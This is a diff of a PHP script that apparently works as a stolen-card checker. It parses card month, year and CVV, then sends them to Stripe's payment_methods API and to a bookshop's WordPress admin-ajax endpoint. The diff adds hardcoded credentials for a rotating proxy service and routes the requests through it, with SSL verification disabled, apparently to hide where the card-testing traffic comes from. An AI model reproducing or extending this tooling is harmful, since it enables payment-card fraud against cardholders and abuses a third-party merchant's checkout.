@@ -47,11 +47,20 @@ $mes = $separa[1];
 $ano = $separa[2];
 $cvv = $separa[3];
 
+$username = "g7305bhx467p4yl";
+$password = "ugv0ew3w009j5ii";
+$PROXYSCRAPE_PORT = 6060;
+$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
+
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
+curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
+curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'POST /v1/payment_methods h2',
 'Host: api.stripe.com',
@@ -66,7 +75,6 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-language: en-US,en;q=0.9',
 ));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
@@ -85,10 +93,9 @@ $username = "g7305bhx467p4yl";
 $password = "ugv0ew3w009j5ii";
 $PROXYSCRAPE_PORT = 6060;
 $PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
-$urlToGet = 'https://alderhousebooks.com/wp-admin/admin-ajax.php?t=1712618145893';
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $urlToGet);
+curl_setopt($ch, CURLOPT_URL, 'https://alderhousebooks.com/wp-admin/admin-ajax.php?t=1712618145893');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
